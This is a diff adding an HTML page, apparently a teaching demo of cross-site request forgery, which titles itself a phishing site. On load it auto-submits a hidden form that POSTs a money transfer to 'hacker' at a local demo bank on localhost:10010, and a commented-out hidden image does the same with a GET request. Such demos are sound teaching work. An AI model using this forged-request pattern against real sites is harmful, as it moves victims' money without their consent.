@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>钓鱼网站</title>
+  <style>
+    html {
+      font-size: 14px;
+    }
+
+    html body {
+      background-color: #ececec;
+    }
+
+    html body .wrapper {
+      width: 50%;
+      margin: 0 auto;
+    }
+
+    html body .wrapper .part {
+      background-color: #fff;
+      margin: 1rem 0;
+      padding: 2rem;
+    }
+
+    h1,
+    h3 {
+      color: coral;
+    }
+
+    code {
+      background-color: #ececec;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="wrapper">
+    <h1>模拟钓鱼网站POST攻击</h1>
+    <!-- <div class="attackGet part">
+      <h3>隐藏在图片中的GET攻击</h3>
+      <p>下面有一个隐藏的图片, 用来攻击get请求</p>
+      <code>&lt;img src="http://localhost:10010/transfer_money?to=hacker&amount=1000" &gt; </code>
+      <img src="http://localhost:10010/transfer_money?to=hacker&amount=1000" alt="">
+    </div> -->
+    <div class="part attackPost">
+      <h3>利用隐藏&lt;form&gt;的post攻击</h3>
+      <code class="formCode">
+        &lt;form action="http://localhost:10010/transfer_money" method="POST" id='hackerForm' class="postForm"&gt;
+        <br/> &lt;input type="hidden" name="to" value="hacker"&gt;
+        <br/> &lt;input type="hidden" name="amount" value="222"&gt;
+        <br/> &lt;/form&gt;
+      </code>
+      <form action="http://localhost:10010/transfer_money" method="POST" id='hackerForm' class="postForm">
+        <input type="hidden" name="to" value="hacker">
+        <input type="hidden" name="amount" value="222">
+      </form>
+    </div>
+  </div>
+  <script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+
+  <script>
+    const log = console.log.bind(console)
+    const host = 'http://localhost:10010'
+    const urlDict = {
+      login: `${host}/login`,
+      logout: `${host}/logout`,
+      tranferMoney: `${host}/transfer_money`,
+      getBalance: `${host}/get_user_balance`,
+    }
+
+    function initPostBtn() {
+      $('.btnPost').click(e => {
+        e.preventDefault()
+        $.ajax(urlDict.tranferMoney, {
+          method: 'POST',
+          data: $('form.postForm').serialize()
+        })
+      })
+
+    }
+
+    function main() {
+      // 打开下面的代码, 发动自动攻击
+      document.getElementById('hackerForm').submit()
+    }
+
+    $(document).ready(function () {
+      log('ready')
+      main()
+    })
+  </script>
+</body>
+
+</html>
